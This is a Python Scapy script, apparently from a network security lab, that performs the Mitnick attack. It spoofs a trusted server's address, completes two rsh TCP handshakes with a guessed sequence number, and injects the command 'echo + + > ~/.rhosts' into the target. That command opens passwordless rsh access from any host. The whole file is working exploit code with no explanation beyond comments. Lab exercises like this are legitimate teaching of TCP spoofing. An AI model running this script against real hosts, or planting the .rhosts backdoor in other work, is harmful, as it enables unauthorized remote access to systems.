#!/usr/bin/python3

from scapy.all import *

# X-Terminal
XT_IP   = '10.9.0.5'
XT_PORT = 514
XT_PORT2 = 1023
# Trusted Server
TS_IP   = '10.9.0.6'
TS_PORT = 1023
TS_PORT2 = 9090
ISN     = 0x123
FILTER  = 'tcp'

# Send the first SYN packet
def send_syn():
    ip  = IP(src=TS_IP, dst=XT_IP)
    tcp = TCP(flags="S", seq=ISN, sport=TS_PORT, dport=XT_PORT)
    send(ip/tcp)
    print('[Connection 1] Spoofed SYN sent\n')

# This is used to control the attack process
step = 1
# We need this to calculate the next sequence number after sending the rsh data
rsh_data_len = 0

def mitnick_spoof(pkt):
    global step
    global rsh_data_len
    # Establishing the first connection
    if(step == 1):
        if(('S' in pkt[TCP].flags) and ('A' in pkt[TCP].flags)):
            print('**** Phase 1: Establishing the first connection and send rsh data ****\n')
            print('[Connection 1] Got SYN+ACK\n')
            # Spoofing the ACK packet
            SEQ = ISN + 1
            ACK = pkt[TCP].seq + 1
            ip  = IP(src=TS_IP, dst=XT_IP)
            tcp = TCP(flags="A", seq=SEQ, ack=ACK, sport=TS_PORT, dport=XT_PORT)
            send(ip/tcp)
            print('[Connection 1] Spoofed ACK sent\n')
            print('[Connection 1] Connection 1 established\n')
            # Spoofing the rsh data packet
            ip  = IP(src=TS_IP, dst=XT_IP)
            tcp = TCP(flags="A", seq=SEQ, ack=ACK, sport=TS_PORT, dport=XT_PORT)
            data = '9090\x00seed\x00seed\x00echo + + > ~/.rhosts\x00'
            rsh_data_len = len(data)
            # The next sequence number via this connection is (SEQ + rsh_dat_len)
            send(ip/tcp/data)
            print('[Connection 1] Spoofed rsh data sent\n')
            step = step + 1
    # Establishing the second connection
    if(step == 2):
        # After XT sends an SYN, we spoof an SYN+ACK
        if(pkt[TCP].flags == 'S'):
            print('**** Phase 2: Establishing the second connection ****\n')
            print('[Connection 2] Got SYN\n')
            # Spoofing the SYN+ACK packet
            SEQ = 0x345 # any sequence number is ok
            ACK = pkt[TCP].seq + 1
            ip  = IP(src=TS_IP, dst=XT_IP)
            tcp = TCP(flags='SA', seq=SEQ, ack=ACK, sport=TS_PORT2, dport=XT_PORT2)
            send(ip/tcp)
            print('[Connection 2] Spoofed SYN+ACK sent\n')
            step += 1
    if(step == 3):
        # After sending SYN+ACK, XT will send back a ACK, then we can get to the next step
        if(pkt[TCP].flags == 'A'):
            print('[Connection 2] Got ACK\n')
            print('[Connection 2] Connection 2 established\n')
            step += 1
    # When the second connection is established
    # XT will send a zero byte via the first connection
    # After we respond an ACK, XT will then execute the command
    if(step == 4):
        # This will be an ACK with a zero byte
        if(pkt[TCP].flags == 'A'):
            print('[Connection 1] Got ACK with zero byte\n')
            # remember that we are not allowed to use the ack of sniffed packets in this lab
            SEQ = ISN + 1 + rsh_data_len
            ACK = pkt[TCP].seq + 1
            ip  = IP(src=TS_IP, dst=XT_IP)
            tcp = TCP(flags="A", seq=SEQ, ack=ACK, sport=TS_PORT, dport=XT_PORT)
            # After receiving this packet, XT will execute our command
            send(ip/tcp)
            print('[Connection 1] Spoofed ACK sent\n')
            step += 1

send_syn()
pkt = sniff(iface='br-b40a80b811bf', filter=FILTER, prn=mitnick_spoof)
